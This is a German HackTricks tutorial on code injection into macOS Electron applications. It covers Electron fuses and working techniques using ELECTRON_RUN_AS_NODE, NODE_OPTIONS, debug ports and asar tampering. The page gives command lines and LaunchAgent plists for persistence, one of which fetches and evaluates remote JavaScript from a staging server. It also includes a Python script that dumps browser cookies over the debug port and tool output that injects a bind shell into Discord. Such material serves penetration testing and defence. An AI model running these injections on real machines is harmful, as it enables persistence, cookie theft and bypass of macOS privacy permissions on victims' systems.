# macOS Electron-Anwendungen Injection

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundinformationen

Wenn du nicht weißt, was Electron ist, kannst du [**hier viele Informationen finden**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Aber für jetzt wisse einfach, dass Electron **node** ausführt.\
Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **anderen Code auszuführen**, abgesehen von der angegebenen Datei.

### Electron Fuses

Diese Techniken werden als nächstes besprochen, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) und diese werden verwendet, um zu **verhindern**, dass Electron-Anwendungen in macOS **willkürlichen Code laden**:

* **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`**, um Code zu injizieren.
* **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht respektiert. Dies vermeidet diesen Weg, um Code zu injizieren.
* **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`** **Datei** von macOS **validiert**. **Verhindert** auf diese Weise **Code-Injektion**, indem der Inhalt dieser Datei geändert wird.
* **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird anstelle der Suche in folgender Reihenfolge: **`app.asar`**, **`app`** und schließlich **`default_app.asar`** nur app.asar überprüft und verwendet, wodurch sichergestellt wird, dass es in Kombination mit dem **`embeddedAsarIntegrityValidation`** Fuse **unmöglich** ist, **nicht-validierten Code zu laden**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browserprozess die Datei namens `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Ein weiterer interessanter Fuse, der die Code-Injektion nicht verhindert, ist:

* **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mit kryptografischen Schlüsseln auf Betriebssystemebene verschlüsselt.

### Überprüfen der Electron Fuses

Du kannst **diese Flags** von einer Anwendung aus überprüfen mit:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Wie die [**Dokumentation erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), sind die Konfigurationen der **Electron Fuses** innerhalb der **Electron-Binärdatei** konfiguriert, die irgendwo die Zeichenfolge **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.

In macOS-Anwendungen befindet sich dies typischerweise in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Sie könnten diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach der vorherigen Zeichenfolge suchen. Nach dieser Zeichenfolge sehen Sie in ASCII eine Zahl "0" oder "1", die angibt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um **die Sicherungswerte zu ändern**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, dass die App nicht ausgeführt wird, wenn Sie versuchen, die **`Electron Framework`-Binärdatei** innerhalb einer Anwendung mit diesen modifizierten Bytes zu **überschreiben**.

## RCE Code zu Electron-Anwendungen hinzufügen

Es könnte **externe JS/HTML-Dateien** geben, die eine Electron-App verwendet, sodass ein Angreifer Code in diese Dateien injizieren könnte, deren Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen könnte.

{% hint style="danger" %}
Es gibt jedoch derzeit 2 Einschränkungen:

* Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist **erforderlich**, um eine App zu ändern, sodass dies standardmäßig nicht mehr möglich ist.
* Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** `und` **`onlyLoadAppFromAsar`** `aktiviert`

Dies macht diesen Angriffsweg komplizierter (oder unmöglich).
{% endhint %}

Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopieren, den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code **modifizieren**, sie wieder in **`app.app/Contents`** umbenennen und sie ausführen.

Sie können den Code aus der asar-Datei mit entpacken:
```bash
npx asar extract app.asar app-decomp
```
Und packe es wieder ein, nachdem du es mit folgendem modifiziert hast:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Laut [**den Dokumenten**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) wird der Prozess, wenn diese Umgebungsvariable gesetzt ist, als normaler Node.js-Prozess gestartet.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert, und das wird nicht funktionieren.
{% endhint %}

### Injection aus der App Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), könnten Sie diese Umgebungsvariable in einer plist missbrauchen, um Persistenz aufrechtzuerhalten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Sie können die Nutzlast in einer anderen Datei speichern und sie ausführen:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Wenn die Sicherung **`EnableNodeOptionsEnvironmentVariable`** **deaktiviert** ist, wird die App die Umgebungsvariable **NODE\_OPTIONS** beim Start **ignorieren**, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.

Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den **Fehler**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Injection aus der App Plist

Sie könnten diese Umgebungsvariable in einer plist missbrauchen, um Persistenz zu gewährleisten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE mit Inspektion

Laut [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flags wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, sodass Sie sich damit verbinden können (zum Beispiel von Chrome in `chrome://inspect`) und Sie werden in der Lage sein, **Code darauf zu injizieren** oder sogar neue Prozesse zu starten.\
Zum Beispiel: 

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Sicherung **`EnableNodeCliInspectArguments`** deaktiviert ist, wird die App **Node-Parameter** (wie `--inspect`) beim Start ignorieren, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls **ignoriert** wird, wenn die Sicherung **`RunAsNode`** deaktiviert ist.

Sie können jedoch immer noch den **Electron-Parameter `--remote-debugging-port=9229`** verwenden, aber die vorherige Payload funktioniert nicht, um andere Prozesse auszuführen.
{% endhint %}

Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie die **Historie** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser **entschlüsselt** sind und es einen **JSON-Endpunkt** gibt, der sie bereitstellt).

Sie können lernen, wie man das macht, [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**diesem Blogbeitrag**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless chrome **willkürliche Dateien an willkürlichen Orten herunterzuladen**.

### Injection aus der App Plist

Sie könnten diese Umgebungsvariable in einer plist missbrauchen, um Persistenz zu gewährleisten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
Der TCC-Daemon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also **keinen Code in eine Electron-Anwendung injizieren können** mit einer der vorherigen Techniken, könnten Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie weiterhin die TCC-Berechtigungen erhält (es sei denn, der Trust Cache verhindert dies).
{% endhint %}

## Run non JS Code

Die vorherigen Techniken ermöglichen es Ihnen, **JS-Code innerhalb des Prozesses der Electron-Anwendung** auszuführen. Denken Sie jedoch daran, dass die **Kindprozesse unter demselben Sandbox-Profil** wie die übergeordnete Anwendung ausgeführt werden und **ihre TCC-Berechtigungen erben**.\
Wenn Sie also Berechtigungen missbrauchen möchten, um beispielsweise auf die Kamera oder das Mikrofon zuzugreifen, könnten Sie einfach **eine andere Binärdatei aus dem Prozess ausführen**.

## Automatic Injection

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann leicht verwendet werden, um **anfällige Electron-Anwendungen** zu finden, die installiert sind, und Code in sie zu injizieren. Dieses Tool wird versuchen, die **`--inspect`**-Technik zu verwenden:

Sie müssen es selbst kompilieren und können es so verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referenzen

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
